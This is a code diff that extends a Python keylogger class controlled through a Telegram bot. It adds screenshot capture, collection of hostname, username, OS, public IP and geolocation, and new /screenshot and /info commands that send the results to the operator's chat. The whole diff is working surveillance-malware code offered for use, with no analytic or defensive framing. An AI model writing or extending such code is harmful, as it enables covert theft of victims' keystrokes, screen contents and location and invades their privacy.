@@ -9,6 +9,9 @@ import time
 from email.mime.text import MIMEText
 import telebot # pip install pyTelegramBotAPI
 from pynput import keyboard # pip install pynput
+from PIL import ImageGrab
+import urllib.request
+import io
 
 # ================= USER CONFIGURATION (HARDCODED) ===================
 # ================= USER CONFIGURATION ===================
@@ -144,6 +147,41 @@ class KeyloggerBot:
         }
         save_config(cfg)
 
+    def get_system_info(self):
+        try:
+            public_ip = urllib.request.urlopen('https://api.ipify.org').read().decode('utf8')
+        except:
+            public_ip = "Unknown"
+        
+        try:
+            # Basic location info
+            with urllib.request.urlopen("http://ip-api.com/json/") as url:
+                data = json.loads(url.read().decode())
+                location = f"{data.get('city')}, {data.get('country')}"
+        except:
+            location = "Unknown"
+
+        info = (
+            f"💻 **System Info**\n"
+            f"Hostname: `{self.hostname}`\n"
+            f"User: `{self.username}`\n"
+            f"OS: `{platform.system()} {platform.release()}`\n"
+            f"Processor: `{platform.machine()}`\n"
+            f"Public IP: `{public_ip}`\n"
+            f"Location: `{location}`"
+        )
+        return info
+
+    def take_screenshot(self):
+        try:
+            screenshot = ImageGrab.grab()
+            bio = io.BytesIO()
+            screenshot.save(bio, 'PNG')
+            bio.seek(0)
+            return bio
+        except:
+            return None
+
     def setup_bot_handlers(self):
         @self.bot.message_handler(commands=['start'])
         def handle_start(message):
@@ -171,6 +209,24 @@ class KeyloggerBot:
             self.update_config() # Persist
             self.bot.reply_to(message, "📴 **Email Logs: DISABLED** (Saved)")
 
+        @self.bot.message_handler(commands=['screenshot'])
+        def handle_screenshot(message):
+            self.bot.send_chat_action(message.chat.id, 'upload_photo')
+            photo = self.take_screenshot()
+            if photo:
+                try:
+                    self.bot.send_photo(message.chat.id, photo, caption="📸 Screenshot Captured")
+                except:
+                    self.bot.reply_to(message, "❌ Error sending photo.")
+            else:
+                self.bot.reply_to(message, "❌ Failed to take screenshot.")
+
+        @self.bot.message_handler(commands=['info'])
+        def handle_info(message):
+            self.bot.send_chat_action(message.chat.id, 'typing')
+            info = self.get_system_info()
+            self.bot.reply_to(message, info, parse_mode="Markdown")
+
         @self.bot.message_handler(commands=['logs'])
         def handle_logs(message):
             if self.log:
@@ -185,7 +241,9 @@ class KeyloggerBot:
                 f"Logging: {'✅ ON' if self.is_logging else '🛑 OFF'}\n"
                 f"Email: {'✅ ON' if self.email_enabled else '📴 OFF'}\n\n"
                 f"**Commands:**\n"
-                f"/start, /stop, /logs, /email_on, /email_off"
+                f"/start, /stop, /logs, /email_on, /email_off\n"
+                f"/screenshot - Capture screen\n"
+                f"/info - System details"
             )
             self.bot.reply_to(message, status_msg, parse_mode="Markdown")
 
